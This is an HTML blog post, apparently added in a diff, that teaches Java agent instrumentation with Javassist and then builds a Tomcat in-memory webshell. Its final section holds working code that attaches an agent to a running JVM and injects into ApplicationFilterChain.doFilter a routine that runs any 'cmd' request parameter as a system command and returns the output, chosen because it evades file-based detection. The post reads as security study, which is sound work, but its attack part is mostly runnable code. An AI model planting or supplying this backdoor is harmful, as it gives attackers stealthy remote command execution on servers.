+            // 添加方法内容到最前，打印方法的第一个参数值
+            helloMethod.insertBefore(&quot;System.out.println($1);&quot;);
+            // 添加方法内容到最后，打印方法的返回值并返回Return:返回值
+            helloMethod.insertAfter(&quot;System.out.println($_); return \&quot;Return:\&quot; + $_;&quot;);
+            File classFilePath = new File(new File(System.getProperty(&quot;user.dir&quot;), &quot;test&quot;), &quot;Test.class&quot;);
+            // 使用类CtClass，生成类二进制
+            byte[] bytes = ctClass.toBytecode();
+            // 将class二进制内容写入到类文件
+            FileUtils.writeByteArrayToFile(classFilePath, bytes);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+</code></pre>
+<p>生成Test.class文件</p>
+<pre><code class="language-java">//
+// Source code recreated from a .class file by IntelliJ IDEA
+// (powered by Fernflower decompiler)
+//
+
+package com.agent;
+
+import java.io.Serializable;
+
+public class Student implements Serializable {
+    private String name;
+    private int age;
+    public String address;
+
+    public Student() {
+    }
+
+    private Student(String name) {
+        this.name = name;
+    }
+
+    Student(String name, int age) {
+        this.name = name;
+        this.age = age;
+    }
+
+    public Student(String name, int age, String address) {
+        this.name = name;
+        this.age = age;
+        this.address = address;
+    }
+
+    private void function() {
+        System.out.println(&quot;function&quot;);
+    }
+
+    public void method1() {
+        System.out.println(&quot;method&quot;);
+    }
+
+    public void method2(String s) {
+        System.out.println(&quot;method&quot; + s);
+    }
+
+    private String method3(String s, int i) {
+        System.out.println(s);
+        String var4 = s + &quot;,&quot; + i;
+        System.out.println(var4);
+        return &quot;Return:&quot; + var4;
+    }
+
+    public String toString() {
+        return &quot;Student{name='&quot; + this.name + '\'' + &quot;, age=&quot; + this.age + &quot;, address='&quot; + this.address + '\'' + '}';
+    }
+}
+</code></pre>
+<h4 id="创建java类二进制">创建Java类二进制</h4>
+<p>假设我们需要生成一个<code>JavassistHelloWorld</code>类，代码如下：</p>
+<pre><code class="language-java">package com.agent;
+
+public class JavassistHelloWorld {
+    private static String content = &quot;Hello world~&quot;;
+    public static void main(String[] args) {
+        System.out.println(content);
+    }
+}
+</code></pre>
+<p><strong>使用Javassist生成类字节码示例：</strong></p>
+<pre><code class="language-java">package com.agent;
+
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtField;
+import javassist.CtMethod;
+import org.apache.commons.io.FileUtils;
+
+import java.io.File;
+
+public class JavassistDemo3 {
+
+    public static void main(String[] args) {
+        // 创建ClassPool对象
+        ClassPool classPool = ClassPool.getDefault();
+        // 使用ClassPool创建一个JavassistHelloWorld类
+        CtClass ctClass = classPool.makeClass(&quot;com.agent.JavassistHelloWorld&quot;);
+        try {
+            // 创建类成员变量content
+            CtField ctField = CtField.make(&quot;private static String content = \&quot;Hello world~\&quot;;&quot;, ctClass);
+            // 将成员变量添加到ctClass对象中
+            ctClass.addField(ctField);
+            // 创建一个主方法并输出content对象值
+            CtMethod ctMethod = CtMethod.make(
+                    &quot;public static void main(String[] args) {System.out.println(content);}&quot;, ctClass
+            );
+            // 将成员方法添加到ctClass对象中
+            ctClass.addMethod(ctMethod);
+            File classFilePath = new File(new File(System.getProperty(&quot;user.dir&quot;), &quot;test&quot;), &quot;JavassistHelloWorld.class&quot;);
+            // 使用类CtClass，生成类二进制
+            byte[] bytes = ctClass.toBytecode();
+            // 将class二进制内容写入到类文件
+            FileUtils.writeByteArrayToFile(classFilePath, bytes);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+</code></pre>
+<p>生成的JavassistHelloWorld.class</p>
+<pre><code class="language-java">package com.agent;
+
+public class JavassistHelloWorld {
+    private static String content = &quot;Hello world~&quot;;
+    public static void main(String[] var0) {
+        System.out.println(content);
+    }
+    public JavassistHelloWorld() {
+    }
+}
+</code></pre>
+<h2 id="内存马">内存马</h2>
+<p>已知在tomcat下注册内存马的方式很多</p>
+<ul>
+<li>动态注册servlet</li>
+<li>动态注册filter</li>
+<li>动态注册listener</li>
+</ul>
+<p>但是我们常用的webshell管理工具冰蝎/哥斯拉往往都是通过Java agent拦截修改关键类字节码实现内存shell</p>
+<p>该方式不会生成新的Servlet，Filter，Listener对象，因此隐蔽性更强。</p>
+<p>唯一美中不足的是，需要生成Agent文件落地，有可能会被IDS文件检测检测到Agent。</p>
+<p>为什么？</p>
+<ul>
+<li>通过拦截修改关键类的字节码，只需要寻找到关键类做处理即可，进而最大程度实现一套代码通用（理论上）。</li>
+</ul>
+<p>怎么利用agent实现内存马？</p>
+<ul>
+<li>
+<p>由于实际环境中我们通常遇到的都是已经启动着的，所以 premain 那种方法不合适内存马注入，所以我们这里利用 agentmain 方法来尝试注入我们的内存马</p>
+</li>
+<li>
+<p>利用JavaAgent的agentmain方法在Instrumentation转换器的过程中通过javassist修改class字节码</p>
+</li>
+</ul>
+<h3 id="简单原理">简单原理</h3>
+<p>接下来我们来做一个简单的内存马原理实验。</p>
+<p>首先我们写一个程序，在执行方法后等待输入，当我们注入JavaAgent后在进行重新执行。</p>
+<p><strong>MemshellDemo1.java</strong></p>
+<pre><code class="language-java">package com.agent;
+
+import java.util.Scanner;
+
+public class MemshellDemo1 {
+        public static void main(String[] args) {
+        while (true){
+            Hello h1 = new Hello();
+            h1.test();
+            Scanner sc = new Scanner(System.in);
+            sc.next();
+        }
+    }
+}
+</code></pre>
+<p><strong>Hello.java</strong></p>
+<pre><code class="language-java">package com.agent;
+
+public class Hello {
+    public void test() {
+        System.out.println(&quot;lyy9&quot;);
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://img-blog.csdnimg.cn/img_convert/1313379a23e87ba2f16c9707b3cf02ba.png" alt="image-20220317081445583" loading="lazy"></figure>
+<p>接下来我们开始写JavaAgent</p>
+<p>修改之前的agentmain和premain函数，先获取所有已经加载的类，然后做一个循环判断类是否已经加载，之后添加Transformer，然后在通过retransformClasses触发过滤已加载的类。</p>
+<p><strong>JavassistTest.java（agentmain）</strong></p>
+<pre><code class="language-java">package com.agent;
+
+import java.lang.instrument.Instrumentation;
+import java.lang.instrument.UnmodifiableClassException;
+
+public class SimpleAgent {
+
+    /**
+     * jvm 参数形式启动，运行此方法
+     *
+     * @param agentArgs
+     * @param inst
+     */
+    public static void premain(String agentArgs, Instrumentation inst)   {
+        System.out.println(&quot;premain&quot;);
+        inst.addTransformer(new TransformerDemo1());
+    }
+
+    /**
+     * 动态 AttachDemo 方式启动，运行此方法
+     *
+     * @param agentArgs
+     * @param inst
+     */
+    public static void agentmain(String agentArgs, Instrumentation inst) throws UnmodifiableClassException {
+        System.out.println(&quot;agentmain&quot;);
+        Class[] classes = inst.getAllLoadedClasses();
+        // 判断类是否已经加载
+        for (Class aClass : classes) {
+            if (aClass.getName().equals(TransformerDemo1.editClassName)) {
+                // 添加 Transformer
+                inst.addTransformer(new TransformerDemo1(), true);
+                // 触发 Transformer
+                inst.retransformClasses(aClass);
+            }
+        }
+
+    }
+}
+</code></pre>
+<p>我们的修改Transformer<strong>TransformerDemo1.java</strong></p>
+<pre><code class="language-java">package com.agent;
+
+import javassist.ClassClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtMethod;
+
+import java.lang.instrument.ClassFileTransformer;
+import java.lang.instrument.IllegalClassFormatException;
+import java.security.ProtectionDomain;
+
+public class TransformerDemo1 implements ClassFileTransformer {
+    public static final String editClassName = &quot;com.agent.Hello&quot;;
+    public static final String editMethod = &quot;test&quot;;
+
+    @Override
+    public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
+        try {
+            //使用 JVM 的类搜索路径
+            ClassPool cp = ClassPool.getDefault();
+            if (classBeingRedefined != null) {
+                //如果存在重定义的类，添加额外的类搜索路径
+                ClassClassPath ccp = new ClassClassPath(classBeingRedefined);
+                cp.insertClassPath(ccp);
+            }
+            //获取我们需要的Class对象
+            CtClass ctc = cp.get(editClassName);
+            //获取我们需要的Method对象
+            CtMethod method = ctc.getDeclaredMethod(editMethod);
+            String source = &quot;{System.out.println(\&quot;hello  lyy9,this is test!\&quot;);}&quot;;
+            //setBody：设置方法体
+            //insertBefore：插入在方法体最前面
+            //insertAfter：插入在方法体最后面
+            //insertAt：在方法体的某一行插入内容
+            method.setBody(source);
+            //获得修改过的类文件
+            byte[] bytes = ctc.toBytecode();
+            ctc.detach();
+            return bytes;
+        } catch (Exception e){
+            e.printStackTrace();
+        }
+        return null;
+    }
+}
+</code></pre>
+<p>重新打包，然后运行MemshellDemo1，正常获取</p>
+<figure data-type="image" tabindex="10"><img src="https://img-blog.csdnimg.cn/img_convert/ef6fb60cc1b548bb802bb6be9c465916.png" alt="image-20220317101237062" loading="lazy"></figure>
+<p>在通过jps获得进程号利用attach方法修改</p>
+<pre><code class="language-java">package com.agent;
+
+import com.sun.tools.attach.AgentInitializationException;
+import com.sun.tools.attach.AgentLoadException;
+import com.sun.tools.attach.AttachNotSupportedException;
+import com.sun.tools.attach.VirtualMachine;
+
+import java.io.IOException;
+
+public class AttachDemo {
+    public static void main(String[] args)
+            throws IOException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, IOException, AgentLoadException, AgentInitializationException {
+        VirtualMachine vm = VirtualMachine.attach(&quot;18588&quot;);
+        vm.loadAgent(&quot;D:\\Java_location\\Java_agent\\target\\Java_agent-1.0-SNAPSHOT-jar-with-dependencies.jar&quot;);
+    }
+}
+</code></pre>
+<p>成功attach，再次输入，方法内容被修改</p>
+<figure data-type="image" tabindex="11"><img src="https://img-blog.csdnimg.cn/img_convert/69b6f8541d4a6ab77cc0a5f7c3a392d1.png" alt="image-20220317101412192" loading="lazy"></figure>
+<h3 id="实战实现">实战实现</h3>
+<p>现在的问题？</p>
+<ol>
+<li><strong>修改哪个关键类的字节码？</strong></li>
+</ol>
+<p>对于第一个问题，其实之前分析过tomcat下的Fliter内存马</p>
+<p>知道当请求到达Servlet之前，一定会经过 Filter ，以此来对我们的请求进行过滤，其中存在一个关键函doFilter</p>
+<p><code>org.apache.catalina.core.ApplicationFilterChain#doFilter</code><br>
+doFilter 函数作用是依次调用 Filter 链上的 Filter，所以 doFilter 函数是一定会被调用的</p>
+<p>该方法有ServletRequest和ServletResponse两个参数，里面封装了请求的request和response。如果我们能够注入该方法，那么我们不就可以直接获取用户的请求，将执行结果写在 response 中进行返回</p>
+<p>SimpleAgent.java</p>
+<pre><code class="language-java">package agent.memshell;
+
+import java.lang.instrument.Instrumentation;
+
+public class SimpleAgent {
+    public static String ClassName = &quot;org.apache.catalina.core.ApplicationFilterChain&quot;;
+    public static void agentmain(String args, Instrumentation inst) throws Exception {
+        inst.addTransformer(new MyTransformer(), true);
+        Class[] loadedClasses = inst.getAllLoadedClasses();
+
+        for (int i = 0; i &lt; loadedClasses.length; ++i) {
+            Class clazz = loadedClasses[i];
+            if (clazz.getName().equals(ClassName)) {
+                try {
+                    inst.retransformClasses(new Class[]{clazz});
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+            }
+        }
+    }
+    public static void premain(String args, Instrumentation inst) throws Exception {
+    }
+}
+</code></pre>
+<p>MyTransformer.java</p>
+<pre><code class="language-java">package agent.memshell;
+import javassist.*;
+
+import java.io.IOException;
+import java.lang.instrument.ClassFileTransformer;
+import java.security.ProtectionDomain;
+
+public class MyTransformer implements ClassFileTransformer {
+    public static String ClassName = &quot;org.apache.catalina.core.ApplicationFilterChain&quot;;
+
+    @Override
+    public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; aClass, ProtectionDomain protectionDomain, byte[] classfileBuffer) {
+        className = className.replace('/', '.');
+
+        if (className.equals(ClassName)) {
+            ClassPool cp = ClassPool.getDefault();
+            if (aClass != null) {
+                ClassClassPath classPath = new ClassClassPath(aClass);
+                cp.insertClassPath(classPath);
+            }
+            CtClass cc;
+            try {
+                cc = cp.get(className);
+                CtMethod m = cc.getDeclaredMethod(&quot;doFilter&quot;);
+                m.insertBefore(&quot; javax.servlet.ServletRequest req = request;\n&quot; +
+                        &quot;            javax.servlet.ServletResponse res = response;&quot; +
+                        &quot;String cmd = req.getParameter(\&quot;cmd\&quot;);\n&quot; +
+                        &quot;if (cmd != null) {\n&quot; +
+                        &quot;Process process = Runtime.getRuntime().exec(cmd);\n&quot; +
+                        &quot;java.io.BufferedReader bufferedReader = new java.io.BufferedReader(\n&quot; +
+                        &quot;new java.io.InputStreamReader(process.getInputStream()));\n&quot; +
+                        &quot;StringBuilder stringBuilder = new StringBuilder();\n&quot; +
+                        &quot;String line;\n&quot; +
+                        &quot;while ((line = bufferedReader.readLine()) != null) {\n&quot; +
+                        &quot;stringBuilder.append(line + '\\n');\n&quot; +
+                        &quot;}\n&quot; +
+                        &quot;res.getOutputStream().write(stringBuilder.toString().getBytes());\n&quot; +
+                        &quot;res.getOutputStream().flush();\n&quot; +
+                        &quot;res.getOutputStream().close();\n&quot; +
+                        &quot;}&quot;);
+                byte[] byteCode = cc.toBytecode();
+                cc.detach();
+                return byteCode;
+            } catch (NotFoundException | IOException | CannotCompileException e) {
+                e.printStackTrace();
+            }
+        }
+        return new byte[0];
+    }
+}
+</code></pre>
+<p>pom.xml</p>
+<p>使用maven-assembly-plugin将依赖内容也一起打包</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;
+         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;
+    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
+
+    &lt;groupId&gt;java_agent_memshell&lt;/groupId&gt;
+    &lt;artifactId&gt;java_agent_memshell&lt;/artifactId&gt;
+    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;
+    &lt;dependencies&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;org.javassist&lt;/groupId&gt;
+            &lt;artifactId&gt;javassist&lt;/artifactId&gt;
+            &lt;version&gt;3.26.0-GA&lt;/version&gt;
+        &lt;/dependency&gt;
+    &lt;/dependencies&gt;
+    &lt;build&gt;
+        &lt;plugins&gt;
+            &lt;plugin&gt;
+                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;
+                &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;
+                &lt;configuration&gt;
+                    &lt;source&gt;7&lt;/source&gt;
+                    &lt;target&gt;7&lt;/target&gt;
+                &lt;/configuration&gt;
+            &lt;/plugin&gt;
+            &lt;plugin&gt;
+                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;
+                &lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt;
+                &lt;configuration&gt;
+                    &lt;descriptorRefs&gt;
+                        &lt;descriptorRef&gt;jar-with-dependencies&lt;/descriptorRef&gt;
+                    &lt;/descriptorRefs&gt;
+                    &lt;archive&gt;
+                        &lt;manifestFile&gt;
+                            src/main/resources/META-INF/MANIFEST.MF
+                        &lt;/manifestFile&gt;
+                    &lt;/archive&gt;
+                &lt;/configuration&gt;
+
+                &lt;executions&gt;
+                    &lt;execution&gt;
+                        &lt;goals&gt;
+                            &lt;goal&gt;attached&lt;/goal&gt;
+                        &lt;/goals&gt;
+                        &lt;phase&gt;package&lt;/phase&gt;
+                    &lt;/execution&gt;
+                &lt;/executions&gt;
+            &lt;/plugin&gt;
+        &lt;/plugins&gt;
+    &lt;/build&gt;
+&lt;/project&gt;
+</code></pre>
+<p>assembly:assembly打包处jar包</p>
+<p>这只是一个简单的demo实现，想要拿到真实环境利用还要完善很多步骤，这里不再深入，如果以后要学agent内存马会在另起一篇文章。</p>
+<h2 id="总结">总结</h2>
+<p>简单来说，java agent是一种插桩技术，使用两种不同的方式，都可以实现对应用程序的动态hook，利用 Instrumentation 做到完全无侵入，通过这种特性发展出了很多新型技术和产品。例：IAST和RASP</p>
+<p>插桩技术可以很好的用于交互式应用检测与程序运行时的自我保护，它通过Java探针达到可以在执行代码底层分析上下文环境的能力。随着计算机各个方面性能的整体提高，也已成为当前安全监测中值得研究的一个方向。</p>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://liangyueliangyue.github.io/post/2021-nian-du-zong-jie/" class="post-title gt-a-link">
+                    2021年度总结
+                </a>
+            </div>
+        
+
+        
+            <span id="/post/java-agent-xue-xi/" class="leancloud_visitors" data-flag-title="JavaSec-Agent">
+                <em class="post-meta-item-text">阅读量 </em>
+                <i class="leancloud-visitors-count">0</i>
+            </span>
+        
+
+        
+
+        
+            <script src='https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js'></script>
+
+<style>
+	div#vcomments{
+		width:100%;
+		max-width: 1000px;
+		padding: 2.5%
+	}
+</style>
+
+
+	<div id="vcomments"></div>
+
+<script>
+	new Valine({
+		el: '#vcomments',
+		appId: 'QR1YL8ep02tLdNVejam0Whhv-gzGzoHsz',
+		appKey: 'I37Ekl4E78WEw4EpQ5WRlzxL',
+		avatar: 'monsterid',
+		pageSize: 5,
+		recordIp: false,
+		placeholder: '留下你的评论！',
+		visitor: true,
+	});
+</script>
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">温润如玉</div>
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/liangyueliangyue" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+    </div>
+    <div>
+        Theme <a href="https://github.com/imhanjie/gridea-theme-pure" target="_blank">Pure</a>, Powered by <a
+                href="https://gridea.dev" target="_blank">Gridea</a> | <a href="https://liangyueliangyue.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
